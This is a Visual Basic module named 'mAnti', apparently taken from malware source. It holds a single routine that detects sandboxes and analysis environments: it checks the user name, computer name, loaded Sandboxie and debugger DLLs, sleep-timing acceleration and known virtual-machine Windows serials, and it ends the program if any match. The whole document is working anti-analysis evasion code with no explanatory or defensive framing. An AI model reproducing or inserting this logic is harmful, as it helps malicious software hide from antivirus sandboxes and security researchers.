Attribute VB_Name = "mAnti"
Option Explicit
Private Declare Function GetModuleHandleA Lib "kernel32" (ByVal lpModuleName As String) As Long
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal lngMilliseconds As Long)

Public Sub sAnti()
Dim aUsers(6)       As String
Dim aComputers(3)   As String
Dim aDlls(1)        As String
Dim aHDDs(3)        As String
Dim aSerials(1)      As String
Dim sUser           As String * 255
Dim sComputer       As String * 255
Dim sWinSerial      As String
Dim bFound          As Boolean
Dim lBefore         As Long
Dim lAfter          As Long
Dim lhKey           As Long
Dim sBuffer         As String
Dim lLen            As Long
Dim i               As Long
Dim oSet            As Object
Dim oObj            As Object

aUsers(0) = "Sndbx"
aUsers(1) = "tester"
aUsers(2) = "panda"
aUsers(3) = "currentuser"
aUsers(4) = "Schmidti"
aUsers(5) = "andy"
aUsers(6) = "Andy"

aComputers(0) = "AUTO"
aComputers(1) = "VMLOG"
aComputers(2) = "NONE-DUSEZ"
aComputers(3) = "XPSP3"

aDlls(0) = "SbieDll.dll"
aDlls(1) = "dbghelp.dll"

aHDDs(0) = "*VIRTUAL*"
aHDDs(1) = "*VMWARE*"
aHDDs(2) = "*VBOX*"
aHDDs(3) = "*QEMU*"

aSerials(0) = "55274-339-6006333-22900"
aSerials(1) = "76487-OEM-0065901-82986"

sUser = Environ("username")
sComputer = Environ("computername")

For i = 0 To UBound(aUsers)
    If Left(sUser, Len(aUsers(i))) = aUsers(i) Then bFound = True
Next i

For i = 0 To UBound(aComputers)
    If Left(sComputer, Len(aComputers(i))) = aComputers(i) Then bFound = True
Next i

For i = 0 To UBound(aDlls)
    If GetModuleHandleA(aDlls(i)) Then bFound = True
Next i

lBefore = GetTickCount
Sleep 510
lAfter = GetTickCount
If (lAfter - lBefore) < 500 Then bFound = True

On Error Resume Next
Set oSet = GetObject("winmgmts:{impersonationLevel=impersonate}").InstancesOf(Split("Win32_OperatingSystem,SerialNumber", ",")(0))
sWinSerial = ""
For Each oObj In oSet
    sWinSerial = oObj.Properties_(Split("Win32_OperatingSystem,SerialNumber", ",")(1)) 'Property value
    sWinSerial = Trim(sWinSerial)
Next
For i = 0 To UBound(aSerials)
    If sWinSerial = aSerials(i) Then bFound = True
Next i

If bFound = True Then End
End Sub
